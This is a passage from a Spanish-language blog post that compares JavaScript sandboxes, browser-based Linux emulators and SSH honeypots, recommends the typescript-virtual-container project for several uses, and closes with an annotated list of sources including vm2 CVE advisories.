| **RAM/instancia** | ~1 MB | ~3–10 MB | ~5–15 MB | 150–256 MB | 200+ MB | ~100 MB | ~50 MB | ~5–20 MB |
| **Deps runtime** | 0 | 1 (nativo) | 1 (Wasm) | 0 | propietario | 1 | deps Python | 3 (ssh2, ws, fflate) |
| **Estado** | estable | ✅ activo | ✅ activo | ✅ muy activo | comercial | ✅ activo | ✅ activo | ✅ activo |

---

## Cuándo usar qué

**Necesitas ejecutar JavaScript no confiable -- una fórmula enviada por un usuario, un plugin, un hook de script.**  
→ `isolated-vm`. V8 Isolate real, límites de memoria duros, puente de comunicación explícito. Evita `vm2` -- la lista de CVEs sigue creciendo, en serio es como uno nuevo cada pocos meses. Evita `vm` -- no es un sandbox en absoluto, por favor.

**Necesitas aislar JS y no quieres un addon nativo, o necesitas compatibilidad con navegador.**  
→ `quickjs-emscripten`. Límite Wasm, módulo ~500 KB, funciona en navegadores y Node. Más lento que V8 pero genuinamente aislado.

**Necesitas arrancar un SO Linux real y sin modificar con compatibilidad binaria.**  
→ `v86` para Linux de 32 bits, o `container2wasm` si tienes una imagen Docker existente. Acepta 150 MB+ de RAM y un arranque de 30 segundos, ese es el trato. Si necesitas 64 bits, mira CheerpX o simplemente usa un runtime de contenedor real.

**Necesitas incrustar una terminal tipo Linux en una aplicación web sin backend.**  
→ `v86` (SO completo, pesado, lento de iniciar) o el bundle de navegador de `typescript-virtual-container` (simulador, más ligero, arranque instantáneo, incluye `startxfce4` para un escritorio completo que está bastante genial la verdad).

**Necesitas tutoriales de programación interactivos en línea o un IDE de navegador.**  
→ WebContainers si estás enfocado en el ecosistema Node.js. CheerpX si necesitas un espacio de usuario Linux real. El bundle de navegador de `typescript-virtual-container` si quieres una opción más ligera con una API tipada.

**Quieres recopilar TTPs de atacantes SSH a escala.**  
→ Cowrie es el estándar de producción, punto final. Se ejecuta en cualquier servidor Linux, se integra con todos los SIEM, tiene modo LLM ahora. Solo usa Cowrie.

**Quieres datos de honeypot SSH en una aplicación Node.js con una API programática.**  
→ `typescript-virtual-container`. Los comandos realmente se ejecutan. El VFS es una estructura de datos real que puedes capturar y diferenciar. El atacante obtiene un entorno interactivo convincente, y tú obtienes datos de auditoría estructurados sin salir de Node.

**Necesitas automatización de shell / pruebas en CI sin Docker.**  
→ `typescript-virtual-container`. Arranque en menos de un segundo, snapshot antes de una prueba, restaura después. Ejecuta comandos de shell con una API tipada. Sin demonio Docker, sin kernel, sin VM, sin esperas.

**Necesitas entornos de shell multi-tenant (SaaS, educación, entrenamiento).**  
→ `typescript-virtual-container`. 5–20 MB por instancia vs. 150–256 MB para un emulador. 100 usuarios concurrentes: ~2 GB vs. ~25 GB. ¡Esa es una gran diferencia en costos de alojamiento!

**Necesitas un honeypot realista que también te permita construir un laboratorio de red multi-VM.**  
→ `typescript-virtual-container` es lo único en este espacio que hace ambas cosas.

---

## Lo que no puede hacer (y quiero ser honesto al respecto)

No puede ejecutar binarios x86 nativos. Si necesitas compilar código C, ejecutar un intérprete de Python real, o usar software compilado para Linux, no hay una ABI de kernel que respalde esas syscalls. Comandos como `gcc`, `python3` y `node` son stubs -- responden a `--version` e invocaciones comunes, pero no ejecutan nada real.

Este es el tradeoff fundamental: ganas 10–50x menos memoria, arranque instantáneo, compatibilidad con navegadores, una API tipada, SSH real y redes virtuales -- y renuncias a la compatibilidad binaria con el espacio de usuario de Linux.

Fortune pensó mucho en esto al diseñar el proyecto. Para los casos de uso que estaba apuntando -- honeypots, pruebas, terminales embebidas, entornos CI -- ejecutar un binario compilado nunca es realmente necesario. Pipelines de shell, manipulación de archivos, enrutamiento de red y SSH cubren todo. Pero si tu caso de uso requiere software compilado real, `v86` o Docker es la respuesta correcta, no esto.

---

## Para cerrar

Bueeeno, sí. Este ecosistema es más amplio y más fragmentado de lo que parece desde fuera. `vm` es un separador de ámbitos, no un sandbox. `vm2` sigue acumulando CVEs (en serio, solo revisa los avisos de este mes). `isolated-vm` es la respuesta correcta para sandboxing JS pero solo JS. `quickjs-emscripten` es la opción correcta cuando necesitas compatibilidad con navegadores o quieres evitar addons nativos. `v86` y CheerpX son emuladores reales cuando necesitas compatibilidad binaria real. WebContainers es Node.js en Wasm, no un entorno Linux general. Cowrie es el estándar de oro para honeypots SSH, pero es Python y no nativo de Node.

Y luego está `typescript-virtual-container` -- el proyecto de Fortune -- que vive en su propia categoría. No es un emulador, no es un sandbox JS, no es un honeypot pasivo. Algo intermedio entre todos ellos que resultó ser sorprendentemente útil para muchas cosas que ninguno de los otros puede hacer.

`typescript-virtual-container` llena el vacío que ninguno de los otros toca: un entorno de shell Linux completo y programático con SSH real, SFTP, permisos POSIX, gestión de usuarios, redes virtuales y una API TypeScript tipada -- ejecutándose en ~10 MB, arrancando en menos de un segundo, funcionando tanto en Node.js como en el navegador.

Si quieres probarlo: el código fuente está en [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) y hay una demo en vivo (incluyendo `startxfce4` para un escritorio completo, que está honestamente genial) en [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). ¡Ve a echarle un vistazo y dale a Fortune algunas estrellas en GitHub, se lo merece!

Gracias por leer -- este fue uno largo incluso para mis estándares :) espero que haya sido útil!

---

## Fuentes

Intenté enlazar cada afirmación a una fuente primaria -- avisos CVE, documentación oficial, repositorios GitHub, publicaciones de blog de mantenedores. Algunas notas: la lista de CVEs de vm2 sigue creciendo, así que el enlace de FortiGuard podría estar desactualizado para cuando leas esto (revisa la página de avisos de GitHub para lo más reciente). Los enlaces de Bellard son todos estables -- su sitio personal ha estado activo para siempre y el contenido no cambia. Y si quieres profundizar en cualquiera de los polyfills, solo navega por la carpeta `polyfills/` en el repositorio de `typescript-virtual-container` directamente -- es más legible que cualquier descripción que pueda escribir aquí.

### Sandboxes de JavaScript

- **Módulo `vm` de Node.js** -- documentación oficial: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Advertencia de seguridad de `vm`** -- «The vm module is not a security mechanism. Do not use it to run untrusted code»: [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **Línea de tiempo CVE de vm2** -- Alerta de brote de FortiGuard con lista completa de CVEs y fechas: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- Escape de pila de error asíncrono, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + Function escape, PoC gist: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- Entrada Exploit DB con PoC completo: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVEs de vm2 2026** -- 11 nuevos escapes de sandbox, análisis: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **«Why Sandboxing JS in JS is Hard»** -- Análisis post-mortem de oxeye.io sobre CVE-2022-36067: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **Internals de V8 Isolate** -- Guía de incrustación: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **Motor QuickJS** -- por Fabrice Bellard: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Modelo de permisos de Deno** -- docs: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Lanzamiento de Deno 2** -- Octubre 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
- **Propuesta TC39 ShadowRealm** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **Propuesta TC39 Compartments** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **«Sandboxing JavaScript Code»** -- Artículo práctico de Andrew Healey sobre el enfoque de sandbox de Deno: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Emuladores de Linux

- **`v86`** -- npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
- **Matriz de soporte de SO de v86** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86#operating-system-support)
- **SeaBIOS** (BIOS usado por v86) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Extensiones Bochs VBE** (referencia VGA) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Emulador de Bellard: [bellard.org/jslinux](https://bellard.org/jslinux/) · Notas técnicas (TinyEMU, historia, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- Código fuente C: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Mirrors no oficiales en GitHub: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- Emulador OpenRISC JS: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- docs: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · Guía de pthreads: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API docs: [webcontainers.io](https://webcontainers.io) · Anuncio: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · Resumen InfoQ: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · Artículo de blog de NTT: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Resumen de Simon Willison: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Stack de terminal

- **xterm.js** -- npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · sitio: [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypots

- **Cowrie** -- GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Docs: [docs.cowrie.org](https://docs.cowrie.org) · Sitio: [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (archivado): [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- Honeypot SSH mínimo en Node.js: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- Lista curada: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- Descubrimiento de información del sistema (cómo los atacantes detectan honeypots): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Demo en vivo**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Guía de arquitectura**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (implementación del protocolo SSH) -- npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (compresión de snapshots VFS) -- npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (transporte WebSocket de shell) -- npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Lectura complementaria

- **Modelo de permisos POSIX** -- Especificación de Open Group: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (patrón usado en persistencia VFS) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **Modelo V8 Isolate** -- «Embedder's Guide»: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **Especificación ISA RISC-V** (para contexto TinyEMU/JSLinux) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **Arquitectura OpenRISC 1000** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **«Running Python code in a Pyodide sandbox via Deno»** -- Simon Willison TIL, contraste útil con el enfoque Wasm: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **«Running self-hosted QuickJS in a browser»** -- Simon Willison TIL sobre el tamaño del bundle de quickjs-emscripten: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
